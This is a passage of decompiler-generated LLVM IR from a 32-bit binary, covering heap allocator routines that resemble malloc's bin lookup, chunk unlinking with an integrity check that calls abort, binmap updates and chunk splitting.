  br i1 %v1_805f590112, label %dec_label_pc_805f4b3, label %dec_label_pc_805f596

dec_label_pc_805f4b3:                             ; preds = %dec_label_pc_805f584.preheader, %bb84
  %v0_805f584113 = phi i32 [ %v0_805f584, %bb84 ], [ %v0_805f584106, %dec_label_pc_805f584.preheader ]
  %v1_805f4b3 = add i32 %v0_805f584113, 4
  %v2_805f4b3 = inttoptr i32 %v1_805f4b3 to i32*
  %v3_805f4b3 = load i32, i32* %v2_805f4b3, align 4
  %v1_805f4b6 = add i32 %v0_805f584113, 12
  %v2_805f4b6 = inttoptr i32 %v1_805f4b6 to i32*
  %v3_805f4b6 = load i32, i32* %v2_805f4b6, align 4
  store i32 %v3_805f4b6, i32* %edx.global-to-local, align 4
  %v1_805f4b9 = and i32 %v3_805f4b3, -4
  store i32 %v1_805f4b9, i32* @edi, align 4
  br i1 %v6_805f44f, label %dec_label_pc_805f4e5, label %dec_label_pc_805f4c6

dec_label_pc_805f4c6:                             ; preds = %dec_label_pc_805f4b3
  %v9_805f4c6 = icmp eq i32 %v3_805f4b6, 134735444
  %v1_805f4cc = icmp eq i1 %v9_805f4c6, false
  br i1 %v1_805f4cc, label %dec_label_pc_805f4e5, label %dec_label_pc_805f4ce

dec_label_pc_805f4ce:                             ; preds = %dec_label_pc_805f4c6
  %v1_805f4ce = load i32, i32* @global_var_807e650.734, align 16
  %v12_805f4ce = icmp eq i32 %v0_805f584113, %v1_805f4ce
  %v1_805f4d4 = icmp eq i1 %v12_805f4ce, false
  br i1 %v1_805f4d4, label %dec_label_pc_805f4e5, label %dec_label_pc_805f4d6

dec_label_pc_805f4d6:                             ; preds = %dec_label_pc_805f4ce
  store i32 %v1_805f4da, i32* %eax.global-to-local, align 4
  %v6_805f4df = icmp ugt i32 %v1_805f4b9, %v1_805f4da
  br i1 %v6_805f4df, label %dec_label_pc_805fa96, label %dec_label_pc_805f4e5

dec_label_pc_805f4e5:                             ; preds = %dec_label_pc_805f4d6, %dec_label_pc_805f4ce, %dec_label_pc_805f4c6, %dec_label_pc_805f4b3
  store i32 ptrtoint (i32* @global_var_807e654.735 to i32), i32* %eax.global-to-local, align 4
  %v2_805f4ea = add i32 %v3_805f4b6, 8
  %v3_805f4ea = inttoptr i32 %v2_805f4ea to i32*
  store i32 ptrtoint (i32* @global_var_807e654.735 to i32), i32* %v3_805f4ea, align 4
  %v0_805f4ed = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805f4ed, i32* @global_var_807e660.736, align 4
  %v0_805f4f0 = load i32, i32* @edi, align 4
  %v15_805f4f0 = icmp eq i32 %v0_805f4f0, %v1_805f796
  br i1 %v15_805f4f0, label %dec_label_pc_805fad7, label %dec_label_pc_805f4fa

dec_label_pc_805f4fa:                             ; preds = %dec_label_pc_805f4e5
  %v6_805f500 = icmp ugt i32 %v0_805f4f0, 255
  br i1 %v6_805f500, label %dec_label_pc_805f513, label %dec_label_pc_805f502

dec_label_pc_805f502:                             ; preds = %dec_label_pc_805f4fa
  %v2_805f504 = udiv i32 %v0_805f4f0, 8
  store i32 %v2_805f504, i32* %esi.global-to-local, align 4
  %v1_805f507 = mul nuw i32 %v2_805f504, 8
  %v2_805f507 = add i32 %v1_805f507, 134735436
  store i32 %v2_805f507, i32* @ebx, align 4
  %v1_805f50e = add i32 %v1_805f507, 134735444
  %v2_805f50e = inttoptr i32 %v1_805f50e to i32*
  %v3_805f50e = load i32, i32* %v2_805f50e, align 4
  store i32 %v3_805f50e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f55c

dec_label_pc_805f513:                             ; preds = %dec_label_pc_805f4fa
  store i32 %v0_805f4f0, i32* @eax, align 4
  %v0_805f515 = call i32 @__malloc_largebin_index()
  store i32 %v0_805f515, i32* %esi.global-to-local, align 4
  %v1_805f51c = mul i32 %v0_805f515, 8
  %v2_805f51c = add i32 %v1_805f51c, ptrtoint (i32* @global_var_807e64c.733 to i32)
  store i32 %v2_805f51c, i32* %eax.global-to-local, align 4
  %v1_805f523 = add i32 %v1_805f51c, add (i32 ptrtoint (i32* @global_var_807e64c.733 to i32), i32 8)
  %v2_805f523 = inttoptr i32 %v1_805f523 to i32*
  %v3_805f523 = load i32, i32* %v2_805f523, align 4
  store i32 %v3_805f523, i32* %edx.global-to-local, align 4
  store i32 %v3_805f523, i32* @ebx, align 4
  %v12_805f52c = icmp eq i32 %v3_805f523, %v2_805f51c
  br i1 %v12_805f52c, label %dec_label_pc_805f55c, label %dec_label_pc_805f530

dec_label_pc_805f530:                             ; preds = %dec_label_pc_805f513
  %v1_805f530 = add i32 %v1_805f51c, add (i32 ptrtoint (i32* @global_var_807e64c.733 to i32), i32 12)
  %v2_805f530 = inttoptr i32 %v1_805f530 to i32*
  %v3_805f530 = load i32, i32* %v2_805f530, align 4
  store i32 %v3_805f530, i32* @ebx, align 4
  %v0_805f533 = load i32, i32* @edi, align 4
  %v2_805f533 = add i32 %v3_805f530, 4
  %v3_805f533 = inttoptr i32 %v2_805f533 to i32*
  %v4_805f533 = load i32, i32* %v3_805f533, align 4
  %v10_805f533 = icmp ult i32 %v0_805f533, %v4_805f533
  %v1_805f536 = icmp eq i1 %v10_805f533, false
  br i1 %v1_805f536, label %dec_label_pc_805f53e, label %dec_label_pc_805f55c

dec_label_pc_805f53e:                             ; preds = %dec_label_pc_805f530
  %v1_805f540 = or i32 %v0_805f533, 1
  store i32 %v1_805f540, i32* %eax.global-to-local, align 4
  store i32 %v3_805f523, i32* %ebx.global-to-local, align 4
  %v2_805f55498 = add i32 %v3_805f523, 4
  %v3_805f55499 = inttoptr i32 %v2_805f55498 to i32*
  %v4_805f554100 = load i32, i32* %v3_805f55499, align 4
  %v10_805f554102 = icmp ult i32 %v1_805f540, %v4_805f554100
  br i1 %v10_805f554102, label %dec_label_pc_805f545, label %dec_label_pc_805f559

dec_label_pc_805f545:                             ; preds = %dec_label_pc_805f53e, %dec_label_pc_805f545
  %v0_805f559103 = phi i32 [ %v3_805f549, %dec_label_pc_805f545 ], [ %v3_805f523, %dec_label_pc_805f53e ]
  store i32 %v0_805f559103, i32* %ecx.global-to-local, align 4
  %v1_805f549 = add i32 %v0_805f559103, 8
  %v2_805f549 = inttoptr i32 %v1_805f549 to i32*
  %v3_805f549 = load i32, i32* %v2_805f549, align 4
  store i32 %v3_805f549, i32* %ecx.global-to-local, align 4
  store i32 %v3_805f549, i32* %ebx.global-to-local, align 4
  %v2_805f554 = add i32 %v3_805f549, 4
  %v3_805f554 = inttoptr i32 %v2_805f554 to i32*
  %v4_805f554 = load i32, i32* %v3_805f554, align 4
  %v10_805f554 = icmp ult i32 %v1_805f540, %v4_805f554
  br i1 %v10_805f554, label %dec_label_pc_805f545, label %dec_label_pc_805f559

dec_label_pc_805f559:                             ; preds = %dec_label_pc_805f545, %dec_label_pc_805f53e
  %v0_805f559.lcssa = phi i32 [ %v3_805f523, %dec_label_pc_805f53e ], [ %v3_805f549, %dec_label_pc_805f545 ]
  %v1_805f559 = add i32 %v0_805f559.lcssa, 12
  %v2_805f559 = inttoptr i32 %v1_805f559 to i32*
  %v3_805f559 = load i32, i32* %v2_805f559, align 4
  store i32 %v3_805f559, i32* @ebx, align 4
  br label %dec_label_pc_805f55c

dec_label_pc_805f55c:                             ; preds = %dec_label_pc_805f502, %dec_label_pc_805f530, %dec_label_pc_805f513, %dec_label_pc_805f559
  %v0_805f55c = phi i32 [ %v0_805f515, %dec_label_pc_805f513 ], [ %v0_805f515, %dec_label_pc_805f559 ], [ %v0_805f515, %dec_label_pc_805f530 ], [ %v2_805f504, %dec_label_pc_805f502 ]
  %stack_var_-64.1 = phi i32 [ %v3_805f523, %dec_label_pc_805f513 ], [ %v0_805f559.lcssa, %dec_label_pc_805f559 ], [ %v2_805f51c, %dec_label_pc_805f530 ], [ %v3_805f50e, %dec_label_pc_805f502 ]
  %v1_805f55e = urem i32 %v0_805f55c, 32
  %v2_805f55e = icmp eq i32 %v1_805f55e, 0
  store i32 %v1_805f55e, i32* %esi.global-to-local, align 4
  store i32 %v1_805f55e, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_805f568 = sdiv i32 %v0_805f55c, 32
  store i32 %v2_805f568, i32* %edx.global-to-local, align 4
  br i1 %v2_805f55e, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_805f55c
  %v5_805f56b = shl i32 1, %v1_805f55e
  store i32 %v5_805f56b, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_805f55c, %bb
  %v5_805f56d = phi i32 [ 1, %dec_label_pc_805f55c ], [ %v5_805f56b, %bb ]
  %v1_805f56d = mul nsw i32 %v2_805f568, 4
  %v2_805f56d = add i32 %v1_805f56d, ptrtoint (i32* @global_var_807e954.737 to i32)
  %v3_805f56d = inttoptr i32 %v2_805f56d to i32*
  %v4_805f56d = load i32, i32* %v3_805f56d, align 4
  %v6_805f56d = or i32 %v4_805f56d, %v5_805f56d
  store i32 %v6_805f56d, i32* %v3_805f56d, align 4
  %v0_805f574 = load i32, i32* @ebx, align 4
  %v1_805f574 = load i32, i32* @ebp, align 4
  %v2_805f574 = add i32 %v1_805f574, 12
  %v3_805f574 = inttoptr i32 %v2_805f574 to i32*
  store i32 %v0_805f574, i32* %v3_805f574, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_805f57b = load i32, i32* @ebp, align 4
  %v2_805f57b = add i32 %v1_805f57b, 8
  %v3_805f57b = inttoptr i32 %v2_805f57b to i32*
  store i32 %stack_var_-64.1, i32* %v3_805f57b, align 4
  %v0_805f57e = load i32, i32* @ebp, align 4
  %v1_805f57e = load i32, i32* @ebx, align 4
  %v2_805f57e = add i32 %v1_805f57e, 8
  %v3_805f57e = inttoptr i32 %v2_805f57e to i32*
  store i32 %v0_805f57e, i32* %v3_805f57e, align 4
  %v0_805f581 = load i32, i32* @ebp, align 4
  %v1_805f581 = load i32, i32* @esi, align 4
  %v2_805f581 = add i32 %v1_805f581, 12
  %v3_805f581 = inttoptr i32 %v2_805f581 to i32*
  store i32 %v0_805f581, i32* %v3_805f581, align 4
  %v0_805f584 = load i32, i32* @global_var_807e660.736, align 32
  store i32 %v0_805f584, i32* @ebp, align 4
  %v9_805f58a = icmp eq i32 %v0_805f584, 134735444
  %v1_805f590 = icmp eq i1 %v9_805f58a, false
  br i1 %v1_805f590, label %dec_label_pc_805f4b3, label %dec_label_pc_805f596

dec_label_pc_805f596:                             ; preds = %bb84, %dec_label_pc_805f584.preheader
  br i1 %v8_805f447, label %dec_label_pc_805f624, label %dec_label_pc_805f5a4

dec_label_pc_805f5a4:                             ; preds = %dec_label_pc_805f596
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_805f5a8 = mul i32 %stack_var_-40.0.ph, 8
  %v2_805f5a8 = add i32 %v1_805f5a8, ptrtoint (i32* @global_var_807e64c.733 to i32)
  store i32 %v2_805f5a8, i32* %edx.global-to-local, align 4
  %v1_805f5af = add i32 %v1_805f5a8, add (i32 ptrtoint (i32* @global_var_807e64c.733 to i32), i32 12)
  %v2_805f5af = inttoptr i32 %v1_805f5af to i32*
  %storemerge1.pre = load i32, i32* %v2_805f5af, align 4
  br label %dec_label_pc_805f620

dec_label_pc_805f5b4:                             ; preds = %dec_label_pc_805f620
  %v1_805f5b4 = add i32 %v4_805f5cb, 4
  %v2_805f5b4 = inttoptr i32 %v1_805f5b4 to i32*
  %v3_805f5b4 = load i32, i32* %v2_805f5b4, align 4
  store i32 %v3_805f5b4, i32* %ebx.global-to-local, align 4
  %v1_805f5b7 = add i32 %v4_805f5cb, 12
  %v2_805f5b7 = inttoptr i32 %v1_805f5b7 to i32*
  %v3_805f5b7 = load i32, i32* %v2_805f5b7, align 4
  store i32 %v3_805f5b7, i32* @ecx, align 4
  %v1_805f5ba = and i32 %v3_805f5b4, -4
  store i32 %v1_805f5ba, i32* @ebx, align 4
  %v10_805f5bd = icmp ult i32 %v1_805f5ba, %v1_805f796
  br i1 %v10_805f5bd, label %dec_label_pc_805f620, label %dec_label_pc_805f5c3

dec_label_pc_805f5c3:                             ; preds = %dec_label_pc_805f5b4
  %v1_805f5c3 = add i32 %v4_805f5cb, 8
  %v2_805f5c3 = inttoptr i32 %v1_805f5c3 to i32*
  %v3_805f5c3 = load i32, i32* %v2_805f5c3, align 4
  store i32 %v3_805f5c3, i32* @edx, align 4
  %v1_805f5c6 = add i32 %v3_805f5c3, 12
  %v2_805f5c6 = inttoptr i32 %v1_805f5c6 to i32*
  %v3_805f5c6 = load i32, i32* %v2_805f5c6, align 4
  %v15_805f5c6 = icmp eq i32 %v3_805f5c6, %v4_805f5cb
  %v1_805f5c9 = icmp eq i1 %v15_805f5c6, false
  br i1 %v1_805f5c9, label %dec_label_pc_805f5d0, label %dec_label_pc_805f5cb

dec_label_pc_805f5cb:                             ; preds = %dec_label_pc_805f5c3
  %v1_805f5cb = add i32 %v3_805f5b7, 8
  %v2_805f5cb = inttoptr i32 %v1_805f5cb to i32*
  %v3_805f5cb = load i32, i32* %v2_805f5cb, align 4
  %v15_805f5cb = icmp eq i32 %v3_805f5cb, %v4_805f5cb
  br i1 %v15_805f5cb, label %dec_label_pc_805f5d5, label %dec_label_pc_805f5d0

dec_label_pc_805f5d0:                             ; preds = %dec_label_pc_805f5cb, %dec_label_pc_805f5c3
  %v0_805f5d0 = call i32 @abort()
  store i32 %v0_805f5d0, i32* %eax.global-to-local, align 4
  %v0_805f5d5.pre = load i32, i32* @ebx, align 4
  %v0_805f5db.pre = load i32, i32* @ecx, align 4
  %v1_805f5db.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805f5d5

dec_label_pc_805f5d5:                             ; preds = %dec_label_pc_805f5cb, %dec_label_pc_805f5d0
  %v1_805f5db = phi i32 [ %v3_805f5c3, %dec_label_pc_805f5cb ], [ %v1_805f5db.pre, %dec_label_pc_805f5d0 ]
  %v0_805f5db = phi i32 [ %v3_805f5b7, %dec_label_pc_805f5cb ], [ %v0_805f5db.pre, %dec_label_pc_805f5d0 ]
  %v0_805f5d5 = phi i32 [ %v1_805f5ba, %dec_label_pc_805f5cb ], [ %v0_805f5d5.pre, %dec_label_pc_805f5d0 ]
  %v5_805f5d7 = sub i32 %v0_805f5d5, %v1_805f796
  store i32 %v5_805f5d7, i32* %esi.global-to-local, align 4
  %v2_805f5db = add i32 %v1_805f5db, 12
  %v3_805f5db = inttoptr i32 %v2_805f5db to i32*
  store i32 %v0_805f5db, i32* %v3_805f5db, align 4
  %v0_805f5de = load i32, i32* @edx, align 4
  %v1_805f5de = load i32, i32* @ecx, align 4
  %v2_805f5de = add i32 %v1_805f5de, 8
  %v3_805f5de = inttoptr i32 %v2_805f5de to i32*
  store i32 %v0_805f5de, i32* %v3_805f5de, align 4
  %v0_805f5e1 = load i32, i32* %esi.global-to-local, align 4
  %v0_805f5e4 = load i32, i32* %eax.global-to-local, align 4
  %v1_805f5e4 = add i32 %v0_805f5e4, 8
  store i32 %v1_805f5e4, i32* @ecx, align 4
  %tmp128 = icmp ult i32 %v0_805f5e1, 16
  br i1 %tmp128, label %dec_label_pc_805fae5, label %dec_label_pc_805f5ed

dec_label_pc_805f5ed:                             ; preds = %dec_label_pc_805f5d5
  %v2_805f5f1 = add i32 %v0_805f5e4, %v1_805f796
  store i32 %v2_805f5f1, i32* %edx.global-to-local, align 4
  %v1_805f5f4 = or i32 %v1_805f796, 1
  store i32 %v1_805f5f4, i32* %ebx.global-to-local, align 4
  %v2_805f5f7 = add i32 %v0_805f5e4, 4
  %v3_805f5f7 = inttoptr i32 %v2_805f5f7 to i32*
  store i32 %v1_805f5f4, i32* %v3_805f5f7, align 4
  %v0_805f5fa = load i32, i32* %esi.global-to-local, align 4
  %v1_805f5fc = or i32 %v0_805f5fa, 1
  store i32 %v1_805f5fc, i32* %eax.global-to-local, align 4
  %v0_805f5ff = load i32, i32* %edx.global-to-local, align 4
  %v1_805f5ff = load i32, i32* @ebp, align 4
  %v2_805f5ff = add i32 %v1_805f5ff, 8
  %v3_805f5ff = inttoptr i32 %v2_805f5ff to i32*
  store i32 %v0_805f5ff, i32* %v3_805f5ff, align 4
  %v0_805f602 = load i32, i32* %edx.global-to-local, align 4
  %v1_805f602 = load i32, i32* @ebp, align 4
  %v2_805f602 = add i32 %v1_805f602, 12
  %v3_805f602 = inttoptr i32 %v2_805f602 to i32*
  store i32 %v0_805f602, i32* %v3_805f602, align 4
  %v0_805f605 = load i32, i32* %edx.global-to-local, align 4
  %v1_805f605 = add i32 %v0_805f605, 8
  %v2_805f605 = inttoptr i32 %v1_805f605 to i32*
  store i32 ptrtoint (i32* @global_var_807e654.735 to i32), i32* %v2_805f605, align 4
  %v0_805f60c = load i32, i32* %edx.global-to-local, align 4
  %v1_805f60c = add i32 %v0_805f60c, 12
  %v2_805f60c = inttoptr i32 %v1_805f60c to i32*
  store i32 ptrtoint (i32* @global_var_807e654.735 to i32), i32* %v2_805f60c, align 4
  %v0_805f613 = load i32, i32* %eax.global-to-local, align 4
  %v1_805f613 = load i32, i32* %edx.global-to-local, align 4
  %v2_805f613 = add i32 %v1_805f613, 4
  %v3_805f613 = inttoptr i32 %v2_805f613 to i32*
  store i32 %v0_805f613, i32* %v3_805f613, align 4
  %v0_805f616 = load i32, i32* %esi.global-to-local, align 4
  %v1_805f616 = load i32, i32* %edx.global-to-local, align 4
  %v3_805f616 = add i32 %v1_805f616, %v0_805f616
  %v4_805f616 = inttoptr i32 %v3_805f616 to i32*
  store i32 %v0_805f616, i32* %v4_805f616, align 4
  br label %dec_label_pc_805faea

dec_label_pc_805f620:                             ; preds = %dec_label_pc_805f5b4, %dec_label_pc_805f5a4
  %v4_805f5cb = phi i32 [ %storemerge1.pre, %dec_label_pc_805f5a4 ], [ %v3_805f5b7, %dec_label_pc_805f5b4 ]
  store i32 %v4_805f5cb, i32* %eax.global-to-local, align 4
  %v12_805f620 = icmp eq i32 %v4_805f5cb, %v2_805f5a8
  %v1_805f622 = icmp eq i1 %v12_805f620, false
  br i1 %v1_805f622, label %dec_label_pc_805f5b4, label %dec_label_pc_805f624.loopexit

dec_label_pc_805f624.loopexit:                    ; preds = %dec_label_pc_805f620
  br label %dec_label_pc_805f624

dec_label_pc_805f624:                             ; preds = %dec_label_pc_805f624.loopexit, %dec_label_pc_805f596
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_805f62d = add i32 %stack_var_-40.0.ph, 1
  %v2_805f630 = udiv i32 %v1_805f62d, 32
  store i32 %v2_805f630, i32* @edi, align 4
  %v1_805f633 = mul i32 %v1_805f62d, 8
  %v2_805f633 = add i32 %v1_805f633, ptrtoint (i32* @global_var_807e64c.733 to i32)
  store i32 %v2_805f633, i32* %ebx.global-to-local, align 4
  %v1_805f63a = urem i32 %v1_805f62d, 32
  %v2_805f63a = icmp eq i32 %v1_805f63a, 0
  store i32 %v1_805f63a, i32* %ecx.global-to-local, align 4
  %v1_805f63d = mul nuw nsw i32 %v2_805f630, 4
  %v2_805f63d = add i32 %v1_805f63d, ptrtoint (i32* @global_var_807e954.737 to i32)
  %v3_805f63d = inttoptr i32 %v2_805f63d to i32*
  %v4_805f63d = load i32, i32* %v3_805f63d, align 4
  store i32 %v4_805f63d, i32* %edx.global-to-local, align 4
  br i1 %v2_805f63a, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_805f624
  %v5_805f644 = shl i32 1, %v1_805f63a
  store i32 %v5_805f644, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_805f624, %bb85, %dec_label_pc_805f685
  %v1_805f646 = phi i32 [ %v1_805f646.pre, %dec_label_pc_805f685 ], [ %v4_805f63d, %bb85 ], [ %v4_805f63d, %dec_label_pc_805f624 ]
  %v0_805f64a = phi i32 [ %v0_805f646.pre, %dec_label_pc_805f685 ], [ %v5_805f644, %bb85 ], [ 1, %dec_label_pc_805f624 ]
  %tmp86 = icmp ule i32 %v0_805f64a, %v1_805f646
  %v1_805f64a = icmp eq i32 %v0_805f64a, 0
  %v1_805f64c = icmp eq i1 %v1_805f64a, false
  %or.cond = and i1 %tmp86, %v1_805f64c
  br i1 %or.cond, label %dec_label_pc_805f64a.dec_label_pc_805f67a.preheader_crit_edge, label %dec_label_pc_805f64e.preheader

dec_label_pc_805f64a.dec_label_pc_805f67a.preheader_crit_edge: ; preds = %.preheader
  %v0_805f67512.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805f67a.preheader

dec_label_pc_805f64e.preheader:                   ; preds = %.preheader
  %v0_805f64e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805f64e

dec_label_pc_805f64e:                             ; preds = %dec_label_pc_805f64e.preheader, %dec_label_pc_805f658
  %v0_805f64e = phi i32 [ %v0_805f64e.pre, %dec_label_pc_805f64e.preheader ], [ %v1_805f64e, %dec_label_pc_805f658 ]
  %v1_805f64e = add i32 %v0_805f64e, 1
  store i32 %v1_805f64e, i32* @edi, align 4
  %v6_805f652 = icmp ugt i32 %v1_805f64e, 2
  br i1 %v6_805f652, label %dec_label_pc_805f701.loopexit, label %dec_label_pc_805f658

dec_label_pc_805f658:                             ; preds = %dec_label_pc_805f64e
  %v1_805f658 = mul i32 %v1_805f64e, 4
  %v2_805f658 = add i32 %v1_805f658, ptrtoint (i32* @global_var_807e954.737 to i32)
  %v3_805f658 = inttoptr i32 %v2_805f658 to i32*
  %v4_805f658 = load i32, i32* %v3_805f658, align 4
  store i32 %v4_805f658, i32* %edx.global-to-local, align 4
  %v1_805f65f = icmp eq i32 %v4_805f658, 0
  br i1 %v1_805f65f, label %dec_label_pc_805f64e, label %dec_label_pc_805f663

dec_label_pc_805f663:                             ; preds = %dec_label_pc_805f658
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_805f66a = mul i32 %v1_805f64e, 256
  store i32 %v2_805f66a, i32* %eax.global-to-local, align 4
  %v1_805f66d = add i32 %v2_805f66a, ptrtoint (i32* @global_var_807e64c.733 to i32)
  store i32 %v1_805f66d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805f67a.preheader

dec_label_pc_805f67a.preheader:                   ; preds = %dec_label_pc_805f64a.dec_label_pc_805f67a.preheader_crit_edge, %dec_label_pc_805f663
  %v0_805f67512 = phi i32 [ %v1_805f66d, %dec_label_pc_805f663 ], [ %v0_805f67512.pre, %dec_label_pc_805f64a.dec_label_pc_805f67a.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_805f663 ], [ %v0_805f64a, %dec_label_pc_805f64a.dec_label_pc_805f67a.preheader_crit_edge ]
  %v0_805f68c = phi i32 [ %v4_805f658, %dec_label_pc_805f663 ], [ %v1_805f646, %dec_label_pc_805f64a.dec_label_pc_805f67a.preheader_crit_edge ]
  %v2_805f67a4 = and i32 %v0_805f68c, %esi.promoted
  %v3_805f67a5 = icmp eq i32 %v2_805f67a4, 0
  br i1 %v3_805f67a5, label %dec_label_pc_805f675, label %dec_label_pc_805f67e

dec_label_pc_805f675:                             ; preds = %dec_label_pc_805f67a.preheader, %dec_label_pc_805f675
  %v2_805f67814 = phi i32 [ %v2_805f678, %dec_label_pc_805f675 ], [ %esi.promoted, %dec_label_pc_805f67a.preheader ]
  %v0_805f67513 = phi i32 [ %v1_805f675, %dec_label_pc_805f675 ], [ %v0_805f67512, %dec_label_pc_805f67a.preheader ]
  %v1_805f675 = add i32 %v0_805f67513, 8
  %v2_805f678 = mul i32 %v2_805f67814, 2
  %v2_805f67a = and i32 %v2_805f678, %v0_805f68c
  %v3_805f67a = icmp eq i32 %v2_805f67a, 0
  br i1 %v3_805f67a, label %dec_label_pc_805f675, label %dec_label_pc_805f67a.dec_label_pc_805f67e_crit_edge

dec_label_pc_805f67a.dec_label_pc_805f67e_crit_edge: ; preds = %dec_label_pc_805f675
  store i32 %v1_805f675, i32* %ebx.global-to-local, align 4
  store i32 %v2_805f678, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805f67e

dec_label_pc_805f67e:                             ; preds = %dec_label_pc_805f67a.dec_label_pc_805f67e_crit_edge, %dec_label_pc_805f67a.preheader
  %v0_805f68e = phi i32 [ %v2_805f678, %dec_label_pc_805f67a.dec_label_pc_805f67e_crit_edge ], [ %esi.promoted, %dec_label_pc_805f67a.preheader ]
  %v1_805f6a8 = phi i32 [ %v1_805f675, %dec_label_pc_805f67a.dec_label_pc_805f67e_crit_edge ], [ %v0_805f67512, %dec_label_pc_805f67a.preheader ]
  %v1_805f67e = add i32 %v1_805f6a8, 12
  %v2_805f67e = inttoptr i32 %v1_805f67e to i32*
  %v3_805f67e = load i32, i32* %v2_805f67e, align 4
  store i32 %v3_805f67e, i32* @ecx, align 4
  %v12_805f681 = icmp eq i32 %v3_805f67e, %v1_805f6a8
  %v1_805f683 = icmp eq i1 %v12_805f681, false
  br i1 %v1_805f683, label %dec_label_pc_805f699, label %dec_label_pc_805f685

dec_label_pc_805f685:                             ; preds = %dec_label_pc_805f67e
  %v1_805f687 = add i32 %v3_805f67e, 8
  store i32 %v1_805f687, i32* %ebx.global-to-local, align 4
  %v1_805f68a = sub i32 -1, %v0_805f68e
  store i32 %v1_805f68a, i32* %eax.global-to-local, align 4
  %v2_805f68c = and i32 %v0_805f68c, %v1_805f68a
  store i32 %v2_805f68c, i32* %edx.global-to-local, align 4
  %v2_805f68e = mul i32 %v0_805f68e, 2
  store i32 %v2_805f68e, i32* %esi.global-to-local, align 4
  %v1_805f690 = load i32, i32* @edi, align 4
  %v2_805f690 = mul i32 %v1_805f690, 4
  %v3_805f690 = add i32 %v2_805f690, ptrtoint (i32* @global_var_807e954.737 to i32)
  %v4_805f690 = inttoptr i32 %v3_805f690 to i32*
  store i32 %v2_805f68c, i32* %v4_805f690, align 4
  %v0_805f646.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_805f646.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_805f699:                             ; preds = %dec_label_pc_805f67e
  %v1_805f699 = add i32 %v3_805f67e, 4
  %v2_805f699 = inttoptr i32 %v1_805f699 to i32*
  %v3_805f699 = load i32, i32* %v2_805f699, align 4
  store i32 %v3_805f699, i32* %edx.global-to-local, align 4
  %v1_805f69c = add i32 %v3_805f67e, 12
  %v2_805f69c = inttoptr i32 %v1_805f69c to i32*
  %v3_805f69c = load i32, i32* %v2_805f69c, align 4
  store i32 %v3_805f69c, i32* %eax.global-to-local, align 4
  %v1_805f69f = and i32 %v3_805f699, -4
  store i32 %v1_805f69f, i32* %edx.global-to-local, align 4
  %v5_805f6a4 = sub i32 %v1_805f69f, %v1_805f796
  store i32 %v5_805f6a4, i32* %esi.global-to-local, align 4
  store i32 %v3_805f69c, i32* %v2_805f67e, align 4
  %v0_805f6ab = load i32, i32* %ebx.global-to-local, align 4
  %v1_805f6ab = load i32, i32* %eax.global-to-local, align 4
  %v2_805f6ab = add i32 %v1_805f6ab, 8
  %v3_805f6ab = inttoptr i32 %v2_805f6ab to i32*
  store i32 %v0_805f6ab, i32* %v3_805f6ab, align 4
  %v0_805f6ae = load i32, i32* %esi.global-to-local, align 4
  %tmp129 = icmp ult i32 %v0_805f6ae, 16
  br i1 %tmp129, label %dec_label_pc_805f6b3, label %dec_label_pc_805f6ba

dec_label_pc_805f6b3:                             ; preds = %dec_label_pc_805f699
  %v0_805f6b3 = load i32, i32* @ecx, align 4
  %v1_805f6b3 = load i32, i32* %edx.global-to-local, align 4
  %v2_805f6b3 = add i32 %v0_805f6b3, 4
  %v3_805f6b3 = add i32 %v2_805f6b3, %v1_805f6b3
  %v4_805f6b3 = inttoptr i32 %v3_805f6b3 to i32*
  %v5_805f6b3 = load i32, i32* %v4_805f6b3, align 4
  %v6_805f6b3 = or i32 %v5_805f6b3, 1
  store i32 %v6_805f6b3, i32* %v4_805f6b3, align 4
  br label %dec_label_pc_805f6f9

dec_label_pc_805f6ba:                             ; preds = %dec_label_pc_805f699
  store i32 %v1_805f796, i32* %eax.global-to-local, align 4
  %v0_805f6c3 = load i32, i32* @ecx, align 4
  %v2_805f6c3 = add i32 %v0_805f6c3, %v1_805f796
  store i32 %v2_805f6c3, i32* %edx.global-to-local, align 4
  %v1_805f6c6 = load i32, i32* @ebp, align 4
  %v2_805f6c6 = add i32 %v1_805f6c6, 8
  %v3_805f6c6 = inttoptr i32 %v2_805f6c6 to i32*
  store i32 %v2_805f6c3, i32* %v3_805f6c6, align 4
  %v0_805f6c9 = load i32, i32* %edx.global-to-local, align 4
  %v1_805f6c9 = load i32, i32* @ebp, align 4
  %v2_805f6c9 = add i32 %v1_805f6c9, 12
  %v3_805f6c9 = inttoptr i32 %v2_805f6c9 to i32*
  store i32 %v0_805f6c9, i32* %v3_805f6c9, align 4
  %v0_805f6cc = load i32, i32* %edx.global-to-local, align 4
  %v1_805f6cc = add i32 %v0_805f6cc, 8
  %v2_805f6cc = inttoptr i32 %v1_805f6cc to i32*
  store i32 ptrtoint (i32* @global_var_807e654.735 to i32), i32* %v2_805f6cc, align 4
  %v0_805f6d3 = load i32, i32* %edx.global-to-local, align 4
  %v1_805f6d3 = add i32 %v0_805f6d3, 12
  %v2_805f6d3 = inttoptr i32 %v1_805f6d3 to i32*
  store i32 ptrtoint (i32* @global_var_807e654.735 to i32), i32* %v2_805f6d3, align 4
  br i1 %v6_805f44f, label %dec_label_pc_805f6e2, label %dec_label_pc_805f6dc

dec_label_pc_805f6dc:                             ; preds = %dec_label_pc_805f6ba
  %v0_805f6dc = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805f6dc, i32* @global_var_807e650.734, align 16
  br label %dec_label_pc_805f6e2

